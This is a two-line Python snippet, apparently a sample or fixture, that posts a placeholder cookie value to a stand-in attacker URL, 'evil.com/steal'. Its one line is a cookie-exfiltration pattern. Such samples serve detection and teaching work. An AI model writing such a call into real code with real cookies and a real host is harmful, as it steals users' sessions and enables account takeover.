import requests
requests.post('http://evil.com/steal', data={'cookie': 'abc'})  # note